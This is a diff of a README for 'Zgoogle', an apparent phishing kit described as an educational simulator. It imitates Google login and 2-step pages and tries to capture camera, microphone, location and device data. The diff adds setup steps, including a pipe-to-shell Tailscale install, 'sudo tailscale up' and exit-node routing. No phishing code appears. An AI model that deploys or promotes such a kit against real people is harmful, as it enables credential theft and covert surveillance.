@@ -3,7 +3,7 @@
 <p align="center">
   <b>An educational cybersecurity-awareness simulator</b><br>
   Demonstrates how phishing pages can mimic Google login screens and attempt to capture photos, audio, geolocation, and device information 🌐📸🎤📍.<br>
-  Built to show how attackers may trick users—even around 2‑step prompts—for training and awareness purposes only 🔒⚠️.
+  Built to show how attackers may trick users—even around 2‑step verification prompts—for training and awareness purposes only 🔒⚠️.
 </p>
 
 <hr>
@@ -25,44 +25,61 @@ git clone https://github.com/zarga33d/Zgoogle.git
 cd Zgoogle
 </code></pre>
 
-<h3>3️⃣ Install the Required Libraries</h3>
+<h3>3️⃣ Install Required Libraries</h3>
 <pre><code class="language-bash">
 pip3 install -r requirements.txt
 </code></pre>
 
-<h3>4️⃣ (Optional) Install Tailscale</h3>
-<p>This is only for secure internal testing environments.</p>
+<hr>
+
+<h2>🔐 (Optional) Tailscale Installation for Internal Testing</h2>
+<p>Used only for secure internal demo environments (NOT for distribution to real users).</p>
+
+<h3>4️⃣ Install Tailscale</h3>
 <pre><code class="language-bash">
-# Install tailscale from official docs (optional for local demo)
+curl -fsSL https://tailscale.com/install.sh | sh
 </code></pre>
 
-<h3>5️⃣ Run the Simulation</h3>
-<p>Run the demo locally for awareness training:</p>
+<h3>5️⃣ Start Tailscale</h3>
+<pre><code class="language-bash">
+sudo tailscale up
+</code></pre>
+
+<h3>6️⃣ Enable Exit Node & Routes</h3>
+<pre><code class="language-bash">
+sudo tailscale set --accept-routes=true --advertise-exit-node
+</code></pre>
+
+<hr>
+
+<h2>▶️ Run the Simulation</h2>
+<p>Run the demo locally for cybersecurity awareness training:</p>
+
 <pre><code class="language-bash">
 sudo python3 google.py
 </code></pre>
 
-<p><b>⚠️ Must be run as root only on your own training machine.</b></p>
+<p><b>⚠️ Must be run locally and only on machines you own.</b></p>
 
 <hr>
 
 <h2>⚡ Features (Simulation Only)</h2>
 <ul>
-  <li>✔ Demonstrates fake login UI techniques</li>
-  <li>✔ Shows simulated camera & microphone request flows</li>
-  <li>✔ Demonstrates location & device fingerprint collection attempts</li>
-  <li>✔ Shows how attackers may mimic 2‑step pages to deceive users</li>
-  <li>✔ Designed for security training, awareness, and demonstrations only</li>
+  <li>✔ Demonstrates realistic phishing UI behavior</li>
+  <li>✔ Simulated camera & microphone request flow</li>
+  <li>✔ Simulated device & location data collection</li>
+  <li>✔ Shows how attackers may mimic 2‑step pages</li>
+  <li>✔ Useful for awareness training & demonstrations</li>
 </ul>
 
 <hr>
 
 <h2>📌 Disclaimer</h2>
 <p style="color:#ff3333;">
-This project is an <b>educational phishing simulation</b> used only for awareness and cybersecurity training.<br>
-It must <b>NOT</b> be sent, deployed, shared, emailed, or messaged to real users.<br>
+This project is an <b>educational phishing simulation</b> intended for training and awareness only.<br>
+It must <b>NOT</b> be deployed, shared, sent, emailed, or messaged to real users under any circumstances.<br>
 Unauthorized phishing is illegal and punishable by law.<br><br>
-The developer (<b>zarga</b>) is <b>not responsible</b> for any misuse or illegal activity involving this project.
+The developer (<b>zarga</b>) is <b>not responsible</b> for any misuse, damage, or illegal activity associated with this simulation.
 </p>
 
 <hr>
